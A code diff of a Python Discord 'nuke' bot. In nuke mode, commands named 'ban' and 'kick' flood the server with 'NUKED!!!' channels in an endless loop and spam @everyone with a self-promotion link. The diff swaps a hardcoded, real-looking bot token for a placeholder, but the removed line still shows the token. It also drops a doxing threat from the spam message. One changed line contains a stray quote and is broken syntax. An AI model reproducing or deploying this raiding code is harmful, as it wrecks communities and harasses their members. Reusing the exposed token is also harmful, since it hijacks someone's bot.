@@ -5,7 +5,7 @@ from discord import Intents
 
 mode = input("Which mode should it be in? N for nuke, D for display.")
 
-TOKEN = 'MTE4NzEwNjYwNzYyMDk1MjIwOQ.GGMpWh.8jzTkTVfqgI3V84NIXRGZuZV2pVs-XA2NB3rS4'
+TOKEN = 'put token here'
 
 bot = commands.Bot(command_prefix='skib?', intents=Intents.all())
 
@@ -25,7 +25,7 @@ async def ban(ctx, member, reason):
     # Create new channels
         while True:
             await ctx.guild.create_text_channel('NUKED!!!')
-            await ctx.send(f"@everyone NUKED BY .ITSF1CKINGSMUG [GO SUB NOW](https://www.youtube.com/@itsf1ckingsmug/featured) OR IM FINNA DOXING  YOU !!!")
+            await ctx.send(f"@everyone NUKED BY .ITSF1CKINGSMUG [GO SUB NOW](https://www.youtube.com/@itsf1ckingsmug/featured)")
     else:
         if member:
             await member.ban(reason=reason)
@@ -49,7 +49,7 @@ async def kick(ctx, member, reason):
         # Create new channels
         while True:
             await ctx.guild.create_text_channel('NUKED!!!')
-            await ctx.send(f"@everyone NUKED BY .ITSF1CKINGSMUG [GO SUB NOW] (https://www.youtube.com/@itsf1ckingsmug/featured) OR IM FINNA DOXING  YOU !!!")")
+            await ctx.send(f"@everyone NUKED BY .ITSF1CKINGSMUG [GO SUB NOW] (https://www.youtube.com/@itsf1ckingsmug/featured)")")
     else:
         if member:
             await member.kick(reason=reason)
